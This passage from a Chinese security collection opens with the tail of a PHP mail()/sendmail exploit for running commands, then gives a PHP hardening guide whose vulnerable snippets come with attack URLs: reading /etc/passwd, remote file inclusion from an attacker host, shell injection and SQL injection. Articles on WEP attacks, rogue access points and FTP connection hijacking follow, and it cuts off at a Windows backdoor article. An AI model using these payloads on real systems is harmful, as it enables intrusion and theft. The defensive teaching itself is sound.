# 注意，下面这两个必须是不存在的，或者它们的属主和本脚本的属主是一样
$script="/tmp/script123";
$cf="/tmp/cf123";
$fd = fopen($cf, "w");
fwrite($fd, "OQ/tmp
Sparse=0
R$*" . chr(9) . "$#local $@ $1 $: $1
Mlocal, P=/bin/sh, A=sh $script");
fclose($fd);
$fd = fopen($script, "w");
fwrite($fd, "rm -f $script $cf; ");
fwrite($fd, $cmd);
fclose($fd);
mail("nobody", "", "", "", "-C$cf");
?>
还是使用以上有问题版本PHP的用户一定要及时升级到最新版本，这样才能消除基本的安全问题。
三、PHP本身的安全配置
PHP的配置非常灵活，可以通过php.ini, httpd.conf, .htaccess文件（该目录必须设置了AllowOverride All或Options）进行设置，还可以在脚本程序里使用ini_set()及其他的特定的函数进行设置。通过phpinfo()和get_cfg_var()函数可以得到配置选项的各个值。
如果配置选项是唯一PHP_INI_SYSTEM属性的，必须通过php.ini和httpd.conf来修改，它们修改的是PHP的Master值，但修改之后必须重启apache才能生效。其中php.ini设置的选项是对Web服务器所有脚本生效，httpd.conf里设置的选项是对该定义的目录下所有脚本生效。
如果还有其他的PHP_INI_USER, PHP_INI_PERDIR, PHP_INI_ALL属性的选项就可以使用.htaccess文件设置，也可以通过在脚本程序自身用ini_set()函数设定，它们修改的是Local值，改了以后马上生效。但是.htaccess只对当前目录的脚本程序生效，ini_set()函数只对该脚本程序设置ini_set()函数以后的代码生效。各个版本的选项属性可能不尽相同，可以用如下命令查找当前源代码的main.c文件得到所有的选项，以及它的属性：
# grep PHP_INI_ /PHP_SRC/main/main.c
在讨论PHP安全配置之前，应该好好了解PHP的safe_mode模式。
1、safe_mode
safe_mode是唯一PHP_INI_SYSTEM属性，必须通过php.ini或httpd.conf来设置。要启用safe_mode，只需修改php.ini：
safe_mode = On
或者修改httpd.conf，定义目录：
<Directory /var/www>
Options FollowSymLinks
php_admin_value safe_mode 1
</Directory>
重启apache后safe_mode就生效了。启动safe_mode，会对许多PHP函数进行限制，特别是和系统相关的文件打开、命令执行等函数。
所有操作文件的函数将只能操作与脚本UID相同的文件，比如test.php脚本的内容为：
<?include("index.html")?>
几个文件的属性如下：
# ls -la
total 13
drwxr-xr-x 2 root root 104 Jul 20 01:25 .
drwxr-xr-x 16 root root 384 Jul 18 12:02 ..
-rw-r--r-- 1 root root 4110 Oct 26 2002 index.html
-rw-r--r-- 1 www-data www-data 41 Jul 19 19:14 test.php
在浏览器请求test.php会提示如下的错误信息：
Warning: SAFE MODE Restriction in effect. The script whose uid/gid is 33/33 is not allowed to access ./index.html owned by uid/gid 0/0 in /var/www/test.php on line 1
如果被操作文件所在目录的UID和脚本UID一致，那么该文件的UID即使和脚本不同也可以访问的，不知这是否是PHP的一个漏洞还是另有隐情。所以php脚本属主这个用户最好就只作这个用途，绝对禁止使用root做为php脚本的属主，这样就达不到safe_mode的效果了。
如果想将其放宽到GID比较，则打开 safe_mode_gid可以考虑只比较文件的GID，可以设置如下选项：
safe_mode_gid = On
设置了safe_mode以后，所有命令执行的函数将被限制只能执行php.ini里safe_mode_exec_dir指定目录里的程序，而且shell_exec、`ls -l`这种执行命令的方式会被禁止。如果确实需要调用其它程序，可以在php.ini做如下设置：
safe_mode_exec_dir = /usr/local/php/exec
然后拷贝程序到该目录，那么php脚本就可以用system等函数来执行该程序。而且该目录里的shell脚本还是可以调用其它目录里的系统命令。
safe_mode_include_dir string
当从此目录及其子目录（目录必须在 include_path 中或者用完整路径来包含）包含文件时越过 UID/GID 检查。 
从 PHP 4.2.0 开始，本指令可以接受和 include_path 指令类似的风格用分号隔开的路径，而不只是一个目录。 
指定的限制实际上是一个前缀，而非一个目录名。这也就是说“safe_mode_include_dir = /dir/incl”将允许访问“/dir/include”和“/dir/incls”，如果它们存在。如果您希望将访问控制在一个指定的目录，那么请在结尾加上一个斜线，例如：“safe_mode_include_dir = /dir/incl/”。 
safe_mode_allowed_env_vars string
设置某些环境变量可能是潜在的安全缺口。本指令包含有一个逗号分隔的前缀列表。在安全模式下，用户只能改变那些名字具有在这里提供的前缀的环境变量。默认情况下，用户只能设置以 PHP_ 开头的环境变量（例如 PHP_FOO = BAR）。 
注: 如果本指令为空，PHP 将使用户可以修改任何环境变量！ 
safe_mode_protected_env_vars string
本指令包含有一个逗号分隔的环境变量的列表，最终用户不能用 putenv() 来改变这些环境变量。甚至在 safe_mode_allowed_env_vars 中设置了允许修改时也不能改变这些变量。 
虽然safe_mode不是万能的（低版本的PHP可以绕过），但还是强烈建议打开安全模式，在一定程度上能够避免一些未知的攻击。不过启用safe_mode会有很多限制，可能对应用带来影响，所以还需要调整代码和配置才能和谐。被安全模式限制或屏蔽的函数可以参考PHP手册。
讨论完safe_mode后，下面结合程序代码实际可能出现的问题讨论如何通过对PHP服务器端的配置来避免出现的漏洞。
2、变量滥用
PHP默认register_globals = On，对于GET, POST, Cookie, Environment, Session的变量可以直接注册成全局变量。它们的注册顺序是variables_order = "EGPCS"（可以通过php.ini修改），同名变量variables_order右边的覆盖左边，所以变量的滥用极易造成程序的混乱。而且脚本程序员往往没有对变量初始化的习惯，像如下的程序片断就极易受到攻击：
<?
//test_1.php
if ($pass == "hello")
$auth = 1;
if ($auth == 1)
echo "some important information";
else
echo "nothing";
?>
攻击者只需用如下的请求就能绕过检查：
http://victim/test_1.php?auth=1
这虽然是一个很弱智的错误，但一些著名的程序也有犯过这种错误，比如phpnuke的远程文件拷贝漏洞：http://www.securityfocus.com/bid/3361
PHP-4.1.0发布的时候建议关闭register_globals，并提供了7个特殊的数组变量来使用各种变量。对于从GET、POST、COOKIE等来的变量并不会直接注册成变量，必需通过数组变量来存取。PHP-4.2.0发布的时候，php.ini默认配置就是register_globals = Off。这使得程序使用PHP自身初始化的默认值，一般为0，避免了攻击者控制判断变量。
解决方法：
配置文件php.ini设置register_globals = Off。
要求程序员对作为判断的变量在程序最开始初始化一个值。
3、文件打开
极易受攻击的代码片断：
<?
//test_2.php
if (!($str = readfile("$filename"))) {
echo("Could not open file: $filename<BR>\n");
exit;
}
else {
echo $str;
}
?>
由于攻击者可以指定任意的$filename，攻击者用如下的请求就可以看到/etc/passwd：
http://victim/test_2.php?filename=/etc/passwd
如下请求可以读php文件本身：
http://victim/test_2.php?filename=test_2.php
PHP中文件打开函数还有fopen(), file()等，如果对文件名变量检查不严就会造成服务器重要文件被访问读取。
解决方法：
如非特殊需要，把php的文件操作限制在web目录里面。以下是修改apache配置文件httpd.conf的一个例子：
<Directory /usr/local/apache/htdocs>
php_admin_value open_basedir /usr/local/apache/htdocs
</Directory>
重启apache后，/usr/local/apache/htdocs目录下的PHP脚本就只能操作它自己目录下的文件了，否则PHP就会报错：
Warning: open_basedir restriction in effect. File is in wrong directory in xxx on line xx.
使用safe_mode模式也能避免这种问题，前面已经讨论过了。
4、包含文件
极易受攻击的代码片断：
<?
//test_3.php
if(file_exists($filename))
include("$filename");
?>
这种不负责任的代码会造成相当大的危害，攻击者用如下请求可以得到/etc/passwd文件：
http://victim/test_3.php?filename=/etc/passwd
如果对于Unix版的PHP（Win版的PHP不支持远程打开文件）攻击者可以在自己开了http或ftp服务的机器上建立一个包含shell命令的文件，如http://attack/attack.txt的内容是<?passthru("ls /etc")?>，那么如下的请求就可以在目标主机执行命令ls /etc：
http://victim/test_3.php?filename=http://attack/attack.txt
攻击者甚至可以通过包含apache的日志文件access.log和error.log来得到执行命令的代码，不过由于干扰信息太多，有时不易成功。
对于另外一种形式，如下代码片断：
<?
//test_4.php
include("$lib/config.php");
?>
攻击者可以在自己的主机建立一个包含执行命令代码的config.php文件，然后用如下请求也可以在目标主机执行命令：
http://victim/test_4.php?lib=http://attack
PHP的包含函数有include(), include_once(), require(), require_once。如果对包含文件名变量检查不严就会对系统造成严重危险，可以远程执行命令。
解决方法：
要求程序员包含文件里的参数尽量不要使用变量，如果使用变量，就一定要严格检查要包含的文件名，绝对不能由用户任意指定。
如前面文件打开中限制PHP操作路径是一个必要的选项。另外，如非特殊需要，一定要关闭PHP的远程文件打开功能。修改php.ini文件：
allow_url_fopen = Off
重启apache。 
5、文件上传
php的文件上传机制是把用户上传的文件保存在php.ini的upload_tmp_dir定义的临时目录（默认是系统的临时目录，如：/tmp）里的一个类似phpxXuoXG的随机临时文件，程序执行结束，该临时文件也被删除。PHP给上传的文件定义了四个变量：（如form变量名是file，而且register_globals打开）
$file #就是保存到服务器端的临时文件（如/tmp/phpxXuoXG ）
$file_size #上传文件的大小
$file_name #上传文件的原始名称
$file_type #上传文件的类型
推荐使用：
$HTTP_POST_FILES['file']['tmp_name']
$HTTP_POST_FILES['file']['size'] 
$HTTP_POST_FILES['file']['name'] 
$HTTP_POST_FILES['file']['type']
这是一个最简单的文件上传代码：
<?
//test_5.php
if(isset($upload) && $file != "none") {
copy($file, "/usr/local/apache/htdocs/upload/".$file_name);
echo "文件".$file_name."上传成功！点击<a href=\"$PHP_SELF\">继续上传</a>";
exit;
}
?>
<html>
<head>
<title>文件上传</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
</head>
<body bgcolor="#FFFFFF">
<form enctype="multipart/form-data" method="post">
上传文件:
<input type="file" name="file" size="30">
<input type="submit" name="upload" value="上传">
</form>
</body>
</html>
这样的上传代码存在读取任意文件和执行命令的重大问题。
下面的请求可以把/etc/passwd文档拷贝到web目录/usr/local/apache/htdocs/test（注意：这个目录必须nobody可写）下的attack.txt文件里：
http://victim/test_5.php?upload=1&file=/etc/passwd&file_name=attack.txt
然后可以用如下请求读取口令文件：
http://victim/test/attack.txt
攻击者可以把php文件拷贝成其它扩展名，泄漏脚本源代码。
攻击者可以自定义form里file_name变量的值，上传覆盖任意有写权限的文件。
攻击者还可以上传PHP脚本执行主机的命令。
解决方法：
PHP-4.0.3以后提供了is_uploaded_file和move_uploaded_file函数，可以检查操作的文件是否是用户上传的文件，从而避免把系统文件拷贝到web目录。
使用$HTTP_POST_FILES数组来读取用户上传的文件变量。
严格检查上传变量。比如不允许是php脚本文件。
把PHP脚本操作限制在web目录可以避免程序员使用copy函数把系统文件拷贝到web目录。move_uploaded_file不受open_basedir的限制，所以不必修改php.ini里upload_tmp_dir的值。
把PHP脚本用phpencode进行加密，避免由于copy操作泄漏源码。
严格配置文件和目录的权限，只允许上传的目录能够让nobody用户可写。
对于上传目录去掉PHP解释功能，可以通过修改httpd.conf实现：
<Directory /usr/local/apache/htdocs/upload>
php_flag engine off
#如果是php3换成php3_engine off
</Directory>
重启apache，upload目录的php文件就不能被apache解释了，即使上传了php文件也没有问题，只能直接显示源码。
6、命令执行
下面的代码片断是从PHPNetToolpack摘出，详细的描述见：
http://www.securityfocus.com/bid/4303
<?
//test_6.php
system("traceroute $a_query",$ret_strs);
?>
由于程序没有过滤$a_query变量，所以攻击者可以用分号来追加执行命令。
攻击者输入如下请求可以执行cat /etc/passwd命令：
http://victim/test_6.php?a_query=www.example.com;cat /etc/passwd 
PHP的命令执行函数还有system(), passthru(), popen()和``等。命令执行函数非常危险，慎用。如果要使用一定要严格检查用户输入。
解决方法：
要求程序员使用escapeshellcmd()函数过滤用户输入的shell命令。
启用safe_mode可以杜绝很多执行命令的问题，不过要注意PHP的版本一定要是最新的，小于PHP-4.2.2的都可能绕过safe_mode的限制去执行命令。
7、sql_inject
如下的SQL语句如果未对变量进行处理就会存在问题：
select * from login where user='$user' and pass='$pass'
攻击者可以用户名和口令都输入1' or 1='1绕过验证。
不过幸亏PHP有一个默认的选项magic_quotes_gpc = On，该选项使得从GET, POST, COOKIE来的变量自动加了addslashes()操作。上面SQL语句变成了：
select * from login where user='1\' or 1=\'1' and pass='1\' or 1=\'1'
从而避免了此类sql_inject攻击。
对于数字类型的字段，很多程序员会这样写：
select * from test where id=$id
由于变量没有用单引号扩起来，就会造成sql_inject攻击。幸亏MySQL功能简单，没有sqlserver等数据库有执行命令的SQL语句，而且PHP的mysql_query()函数也只允许执行一条SQL语句，所以用分号隔开多条SQL语句的攻击也不能奏效。但是攻击者起码还可以让查询语句出错，泄漏系统的一些信息，或者一些意想不到的情况。
解决方法：
要求程序员对所有用户提交的要放到SQL语句的变量进行过滤。
即使是数字类型的字段，变量也要用单引号扩起来，MySQL自己会把字串处理成数字。
在MySQL里不要给PHP程序高级别权限的用户，只允许对自己的库进行操作，这也避免了程序出现问题被 SELECT INTO OUTFILE ... 这种攻击。
8、警告及错误信息
PHP默认显示所有的警告及错误信息：
error_reporting = E_ALL & ~E_NOTICE
display_errors = On
在平时开发调试时这非常有用，可以根据警告信息马上找到程序错误所在。
正式应用时，警告及错误信息让用户不知所措，而且给攻击者泄漏了脚本所在的物理路径，为攻击者的进一步攻击提供了有利的信息。而且由于自己没有访问到错误的地方，反而不能及时修改程序的错误。所以把PHP的所有警告及错误信息记录到一个日志文件是非常明智的，即不给攻击者泄漏物理路径，又能让自己知道程序错误所在。
修改php.ini中关于Error handling and logging部分内容：
error_reporting = E_ALL
display_errors = Off
log_errors = On
error_log = /usr/local/apache/logs/php_error.log
然后重启apache，注意文件/usr/local/apache/logs/php_error.log必需可以让nobody用户可写。
9、disable_functions
如果觉得有些函数还有威胁，可以设置php.ini里的disable_functions（这个选项不能在httpd.conf里设置），比如：
disable_functions = phpinfo, get_cfg_var
可以指定多个函数，用逗号分开。重启apache后，phpinfo, get_cfg_var函数都被禁止了。建议关闭函数phpinfo, get_cfg_var，这两个函数容易泄漏服务器信息，而且没有实际用处。
10、disable_classes
这个选项是从PHP-4.3.2开始才有的，它可以禁用某些类，如果有多个用逗号分隔类名。disable_classes也不能在httpd.conf里设置，只能在php.ini配置文件里修改。
11、open_basedir
前面分析例程的时候也多次提到用open_basedir对脚本操作路径进行限制，这里再介绍一下它的特性。用open_basedir指定的限制实际上是前缀，不是目录名。也就是说 "open_basedir = /dir/incl" 也会允许访问 "/dir/include" 和 "/dir/incls"，如果它们存在的话。如果要将访问限制在仅为指定的目录，用斜线结束路径名。例如："open_basedir = /dir/incl/"。
可以设置多个目录，在Windows中，用分号分隔目录。在任何其它系统中用冒号分隔目录。作为Apache模块时，父目录中的open_basedir路径自动被继承。
四、其它安全配置
1、取消其它用户对常用、重要系统命令的读写执行权限
一般管理员维护只需一个普通用户和管理用户，除了这两个用户，给其它用户能够执行和访问的东西应该越少越好，所以取消其它用户对常用、重要系统命令的读写执行权限能在程序或者服务出现漏洞的时候给攻击者带来很大的迷惑。记住一定要连读的权限也去掉，否则在linux下可以用/lib/ld-linux.so.2 /bin/ls这种方式来执行。
如果要取消某程如果是在chroot环境里，这个工作比较容易实现，否则，这项工作还是有些挑战的。因为取消一些程序的执行权限会导致一些服务运行不正常。PHP的mail函数需要/bin/sh去调用sendmail发信，所以/bin/bash的执行权限不能去掉。这是一项比较累人的工作，
2、去掉apache日志其它用户的读权限
apache的access-log给一些出现本地包含漏洞的程序提供了方便之门。通过提交包含PHP代码的URL，可以使access-log包含PHP代码，那么把包含文件指向access-log就可以执行那些PHP代码，从而获得本地访问权限。
如果有其它虚拟主机，也应该相应去掉该日志文件其它用户的读权限。
当然，如果你按照前面介绍的配置PHP那么一般已经是无法读取日志文件了。
有关无线安全与黑客的话题
这是有关无线话题的最后一篇文章。[Just to remind you, the first article introduced the reader to the Wireless world and discussed Wireless devices and protocols. The second article went deeper into Wireless networks, provided general info on WLAN and discussed IEEE standards for
them.]本篇将介绍WLAN安全，说明一些最常见的攻击技术并介绍一些有用的工具。
概论
先简单介绍无线网络的扑拓。无线网络有两个主要的组成部件：基站和网络桥接器[stations(STA)and access points(AP)].存在有[ad-hoc(peer-to-peer)and infrastructure mode]两种无线网络操作模式.在[the ad-hoc mode]模式下客户端(STA)与客户端之间可以在网络内直接通信，无需透过Access Point。在[the infrastructure mode]模式下客户端发送通信请求给总站，即[Access Point (AP)],它的作用就好比网桥.该模式是种整合了有线与无线局域网络架构的应用模式。
一台装有无线网卡的客户端与网络桥接器(ap)间在传递数据前必须建立关系。一旦建立了关系它们将是以下三种状态中的一种：
1.未授权和无关联。
2.授权但无关联。
3.授权并关联。
只有在第三种状态下信息交换才成为可能。届时网络桥接器(ap)以特定的频率发送标志管理帧。客户端收到后，通过发送授权帧建立授权。授权成功后客户端又发送关联帧，最后网络桥接器(ap)回应关联。
无线网络安全机制
802.1标准为建立无线网络安全环境提供了一些机制。本段将为您介绍五种应用广泛的机制。
#连接对等协议[Wired Equivalent Protocol]
连接对等协议或WEP，首先被802.1标准的作者设计。那时WEP并不象IPSec协议一样用于提供网络安全，而是用于提供对等的保密级别。WEP的目标是通过加密无线电波来提供安全保证。WEP被用来阻止对无线网络的非法存取。在外传数据已加密并打包的情况下WEP被缺省停用。
连接对等协议依赖共享于基本设置服务(Basic Set Service)上的密钥.该密钥在传输前加密数据包，并且在它上面进行一次完整性检查。WEP使用的是一种流码名叫RC4算法。流码是将短钥扩充为无穷随机码的系统。
WEP加密算法
*尽管完整性算法提供了完整性检查值，比如我们所知的ICV,但纯文本消息仍在使用。802.11标准规定了CRC-32的使用。
*在纯文本消息的最后附加了完整性检查值。
*24位的初始化向量(IV)产生其后连接着密钥。WEP的伪随机数生成器[pseudo-random number generator(PRNG)]用它产生种子值。
*PRNG产生密钥序列。
*数据通过与密钥序列异或完成加密。
*暴露的IV被附加到保护帧(连同加密文本)并发送。
通过上面的条目，算法与解译过程可以被很容易地猜测。IV的作用是延长密钥的生存周期。
WEP使用的是RC4密钥流，因此需要通过异或数据/ICV的联合体和24位IV,共64位key来产生它，密钥的长度为40-bit.
#WEP 2
2001年在发现许多存在于最初WEP协议中的漏洞后，电子电气工程师协会(IEEE)建议修改WEP协议。新版本的WEP2将IV的空间从24位增加到128位，并提供了Cerberus V的支持，但根本问题仍未被解决(这将在后面讨论)。
对全部WEP2的支持还有待于进一步的完善。
#开放系统认证[Open System Authentication]
每无线的网络有2个认证系统.开放系统认证是第一个并且是被802.11缺省的认证协议。从名字我们就可看出该系统接受任何认证请求(比如空口令的root帐号)。WEP的无益体现在试验证明认证管理帧的暴露即使WEP已被启动。
#访问控制列表[Access Control List]
在802.11标准中没有定义这种安全特征，但卖主用它提供额外附加的安全机制。访问控制列表基于客户的无线网卡MAC地址(为每个NIC唯一确定)。网络桥接器(ap)通过ACL限制某些客户使用网络。若用户的MAC地址存在于ACL则访问允许，否则，禁止。
#封闭的网络存取控制[Closed Network Access Control]
这一特征使得管理员可以选择使用开放式网络或封闭式网络。开放式网络意味着任何人都被允许加入网络,而在封闭式网络，只有那些知道网络名或SSID的顾客才能加入。网络名就充当一把公钥。
无线网络攻击
你会发现本章节的内容更吸引人。它将介绍一些普通的用于破坏无线网络和盗窃带宽的攻击技术，确实很有趣。如果你附近有无线网络或你居住的地区无线技术已被广泛地使用，下面描述的任何攻击技术将有98%的成功率。
目前被攻击者盯上的无线网络有95%是完全无防卫的。当前的标准(802.11b)允许的带宽达11MBps。如果受攻击的无线网络使用缺省设置值,则在带宽上将没有限制,它意味着攻击者能拥有完全的存取能力。在Neworder有一个很令人信服的例子-http://neworder.box.sk/newsread.php@newsid=3899
#桥接器电子欺骗与MAC地址嗅探[Access Point Spoofing & MAC Sniffing]
严密的身份认证手段使得存取控制列表列表[Access control list]提供合理的安全水平。但不幸地是MAC地址并未幸免。攻击者可轻松地嗅到MAC地址因为它们肯定会被暴露即使当WEP被启用时。另外，无线网卡允许通过软件更换MAC地址。一个攻击者能使用这些“特性”通过对网卡的编程伪装成有效的MAC地址，进入并享有网络。
MAC地址的欺骗是很容易的。使用捕获包软件，攻击者能获得一个的有效的MAC地址包。如果无线网卡防火墙允许改变MAC地址，那一切皆会发生。
如果一个攻击者有台无线设备，并且他/她在无线网络附近,他将能上演欺骗攻击。欺骗攻击中，攻击者必须设置一个网络桥接器(AP),这里我们叫它“强盗”。它处于目标无线网络附近或在一个可被牺牲品信认的地点。如果“强盗”的信号强于真实的网络桥接器(AP)的信号，受害者的计算机将会联接到攻击者的(Ap)中。一旦牺牲品建立连接，攻击者就能偷窃他的口令，享有它的权限，设置后门等等。这种攻击主要用于获取口令。
#WEP攻击[WEP Attacks] 
明文攻击
第一种情况：攻击者同时拥有明文本消息和其加密文本的拷贝。两者之间失去的部分便是密钥。为得到密钥，攻击者将发送一数据到目标系统,同时又试图捕获那被送到目标系统的数据。一旦攻击者捕获到数据,他便得到了IV。现在，他就能简单地运用字典攻击破解密钥。
另外在密文是通过明文与密钥流简单XOR形成的情况下。如攻击者拥有加密文本和明文,就能XOR已加密文本从而获得密钥流。攻击者使用正确的IV和密钥流，可在没有被认证的情况下进入无线网络。
密文的再利用[Cipher stream Reuse]
该问题允许攻击者从一个WEP包(编码的包)复原密钥流。WEP的cipherment算法初始化向量时只声明了小空间，通过溢出的方法发送各种各样的IV包,攻击者能捕获密钥流。之后,攻击者XOR明文本消息来解译密文(注意攻击必须同时拥有密文本和明文本)。再以后，当认证数据在网络中传送时,攻击者能将它截取，并使用密钥认证数
据的明文。
Fluhrer-Mantin-Shamir Research
Cisco系统的Scott Fluhrer，以色列Weizmann研究所计算机科学部的Itsik Mantin和Adi Shamir在一年前着手该项研究工程(2001年8月)。该项研究的目的在于解决RC4密钥排列算法[Key Scheduling Algorithm (KSA)]的缺陷。
这个团体发现了KSA的两处缺陷。在他们研究论文中描述的攻击技术,既可以破解WEP(24位长)也可破解WEP2(128位长)的密码。Adam Stubblefield或Rice大学、John Loannidis和AT&T实验室的Aviel Rubin也证实了这一攻击技术。如此一来，2件新工具(air snort和WEPCrack)流传开来。但他们的源编码还未对外公布。
#Man-in-the-middle攻击
大多此类攻击都建立在毒害ARP或毒害缓存上。基本上，ARP欺骗是利用IP与以太网协议间相互作用的一种方法。由于这篇文章不介绍ARP协议或ARP攻击，所以我将简略描述其攻击及其目的。
攻击者利用一个与目标网络具有相同类型的个人虚拟网络服务器结合access point,在用户试图连接上真实服务器时，伪装的服务器响应了它并将它连接向假冒的服务器。
考虑到这类的攻击在该篇文章中很难解释清楚，故向您推荐一些关于ARP的好文章在http://www.ebcvg.com/default.htm 
#Low-Hanging Fruit
由于大多的无线网络是完全无防卫的(他们使用开系统认证)，且在缺省的情况下WEP不起作用，因此许多的无线网络攻击者都以此方法作为开始。
一个攻击者所需的只是一块无线网卡和一台扫描仪(在文章的最后将有所解释)。攻击者扫描那些允许任何人联入的开放式的access point，通过它攻击者们可得到免费的互连网使用权限，并能发动肉鸡攻击(攻击第三方)等等。
无线网络的安全
由于无线网络使得雇员们在任何地点都能方便连入WLAN,因此无线网络在公司之间已经变得十分流行。但就像其它新技术一样无线网络在安全方面的考虑是不够周到的。这节将描述一些最普通的改进无线网络安全的方法。
#MAC地址过滤
这种方法将那些允许连入access point顾客的无线网卡的MAC地址列成一张表。如果存有多台access point，则在所有的这些access point上列表都有效。管理人们应该时刻注意列表是否被更改。尽管这种方法不是很牢靠(上面曾有谈到)，但在过去它是种广泛使用的无线网络保安方法。 
#WEP
正如上面曾说的，WEP为顾客和access point之间的通讯提供数据编码的保护水平。值得一提的是WEP应该被开启，因为没有必要为攻击行为大开方便之门。需再次提醒的是:WEP不是万能的，甚至在有些类型的攻击下它很脆弱。
#SSID(Network ID)
为加强无线网络的安全，第一次的尝试是使用网络标识符(SSID)。当一位无线顾客想要与access point联系时，SSID在这期间将被传播。SSID是被固定编入access point和客户端设备的一个7位字符。通过使用SSID,仅有那些持有正确网络标识符的顾客才被允许与access point连接。在WEP启用后，SSID在传播中被从新编码,但
如果攻击者拥有与设备的物理连接，他/她将能获取以明文保存的SSID。
一旦SSID被某攻击者俘获，无线网络管理员人必须手工分配一个新的SSID。
#防火墙
使用防火墙来阻止对无线网络的非法存取可能是唯一的可靠手段。正如下面所提及的，对网络的存取需依靠IPSec，secure shell或VPN。这样，防火墙应该被配置成只允许指定的IPSec或secure shell通信。下面将解释从有线访问无线网络:
1.无线顾客端认证并与无线access point关联。为保证更好的安全,access point应被配置成可过滤MAC地址。
2.access point送一个请求给DHCP服务器。然后服务器为顾客分配网络地址。
3.一旦网络地址被分配，无线顾客便已进入无线网络。为能存取有线网络，它可建立一条IPSec VPN通道或使用secure shell.
为防火墙进行安全配置十分重要，只有这样所有的非法联接才会被拒绝。
#网络桥接器[Access Points]
Access Points应该被配置成能过滤MAC地址,尽管MAC地址能被欺骗(看上面)。如果允许与它非法物理连接，管理员们应确保AP被安置于一个安全的地方。
我们知道通过telnet或浏览器或简单网管协议可配置AP。但这里推荐只通过telnet并禁止其他所有别的途径。
#设计考虑[Design Considerations]
在实施任何加强无线网络安全的措施前，适当地计划十分重要。适当计划能排除与无线网络被联系后可能存在的一些风险。 
一些计划的要点：
1.用VPN或访问控制列表保护你的无线网络。
2.即使WEP被启用access point也不应该与内部的有线网络相连。
3.无论怎样access point都不应放置在防火墙之后。
4.无线客户应该通过secure shell,IP-Sec或virtual private network建立与网络的连接。这些方式提供了用户授权，认证和编码等措施来加固你的网络安全。
对于ftp服务程序一些不安全因素的研究
FTP(File Tranfer Protocol)是一种很古老的协议来的了，自unix始就一直有使用的了，FTP因为本身不但可以提供多用户同时下载的功能外，还可以让用户上载文件,在不断的发展中，还可以使用ftp远程执行命令，由于FTP一般需要帐户和密码的，而且对于不同的帐户可提供不同的权限，由于这么多的功能，所以一直至今还是相当流行的。不过，以下我会说说FTP服务程序很可能出现的安全方面的问题。
FTP的连接一般是有两个连接的，一个是客户程和服务器传输命令的，另一个是数据传送的连接。FTP服务程序一般会支持两种不同的模式，一种是Port模式，一种是Passive模式(Pasv Mode),我先说说这两种不同模式连接方式的分别。
先假设客户端为C,服务端为S.
Port模式:
当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进去数据连接),当服务端S收到这个Port命令后
，就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。
Pasv模式:
当客户端C向服务端S连接后，服务端S会发信息给客户端C,这个信息是(服务端S在本地打开了一个端口M,你现在去连接我吧),当客户端C收到这个信息后，就可以向服务端S的M端口进行连接,连接成功后，数据连接也建立了。
从上面的解释中，大家应该可以看到两种模式主要的不同是数据连接建立的不同，对于Port模式，是客户端C在本地打开一个端口等服务端S去连接建立数据连接；而Pasv模式就是
服务端S打开一个端口等待客户端C去建立一个数据连接。
两种模式看起来其实都是没什么问题，但其实都是隐藏着安全方面的问题的。
对于Port模式，这种模式多是用于因为服务端有防火墙，无法使用Pasv在服务端打开端口让客户端去连接而被逼使用的，但由于连接本身是由服务端本身向外连接的，这本身就存在了一个安全的问题了,因为如果这个连接一旦被hijack,由于连接是由服务器本身向外连的，防火墙将不会有任何动作去处理这个连接。
对于Pasv模式，看起来是比Port模式安全很多不过认真想一想的话，还是会发现它本身的问题的。由于服务端会打开一个端口等客户端去连接，但如果这个打开的端口并没有检测连接的IP是否那个是那个客户端的IP，那么安全问题的出现了。因为有很多FTP服务器打开的数据端口等客户端连接是随机的，但都会在一定范围内的，例如是20000-21000这些端口间。如果FTP服务器并没有在接收数据端口的连接时检测连接过来的IP是不是已经是合法登陆的用户的话，那么其他并没有登陆的用户就很有机会写程序hijack这个连接了。以下给一个例子说明一下:
服务端S接收到客户端C(IP=12.12.12.12)的命令连接使用的是Pasv模式，服务端S打开了端口20000等待数据连接，在这时，一位黑客(IP=11.11.11.11)扫描了服务端S的20000到20100的端口，发现了20000端口打开了，马上就连接上去服务端S的20000这个端口了。在这情况中，如果服务端S并没有检测11.11.11.11这个IP是不是合法登陆的用户的IP的话，那么真正的客户端C的数据连接就被人hijack了，如果客户端C发送给服务端S的命令是下载某个文件的话，那么那个文件只会发送到那个黑客中去了。这种情况下，黑客可以是随机扫描并hijack到不同的连接，或者可以同时对那些端口不停的连接，那么合法用户的连接就会很多被hijack了，hijack后黑客会做什么，那就视乎那位黑客的能力和想做什么了。
解决:
对于Port模式，由于那是FTP本身的问题，所以没有什么解决的好方法。或者可以的话，只是允许Pasv模式而不允许Port模式。
对于Pasv模式，只要在接收到数据连接时检测IP是不是合法用户的请求，就可以避免连接被hijack的问题。
以上hijack连接的都属于比较高级的"黑客"才有机会实现的，因为对于不同的FTP服务程序是有所不同的，而且一般是需要自己先研究过那个FTP服务程序然后再写程序才有可能实现的。以下说说一般用户都可以因为写FTP服务程序对于安全的不注重而进行通过FTP而入侵到系统的问题。
这个问题其实平时都是很常见的了，一般都是对于用户登入FTP后可以跳转到的目录的权限限制问题。
很多用过的FTP程序(最基本的FTP服务，只提供上传，下载，连用户名和密码都不需要那种)，如anonymouse ftp(aftp)那类，根本不会限制登陆用户可以跳转到的目录，就是说登入的用户可以随意查看系统不同目录的文件，下载不同目录的文件或者上传文件到任何目录中去的，可以下载任何文件或上传任何文件到任何目录，这问题有多严重，我也不需要说了吧。
有的FTP程序，虽然提供了用户名和密码，但一样没有对于用户可访问目录进行任何限制，xfocus的出品，xftpd就是一个很好的例子，用户登入后，一样是可以上面所说的，用户可以下载系统任何文件或上传任何文件到任何目录中去的。
有的FTP,就是对于要限制可访问的目录的检测不够全面，导致登入用户可以使用一些特殊的字符而可以访问到限制访问的目录中去。好的一个例子就是旧版的slimftpd了。这种情况一般称为"Directory Traveling Vulnerability",很多旧版的共享的FTP服务程序都曾存在过这些问题的。
如果你要建立一个FTP服务器，我可以给的建议就是选择一个比较稳定和安全的FTP程序(当然可以考虑自己写的)，然后在真正投入使用前对于上面所提及到的安全问题都自己检测一下，如果是自己写的话可以发布些免费版本(不是全功能的)给用户去测试一下，测试没问题后再投入正式使用。
上面所写都是在和朋友开发FTP服务程序时研究FTP协议时看到或在测试时的一些小心得，错漏的地方也是难免的，如果看到有什么错误的地方可以跟贴指出。
浅析Windows2000/XP服务与后门技术
一> 序言
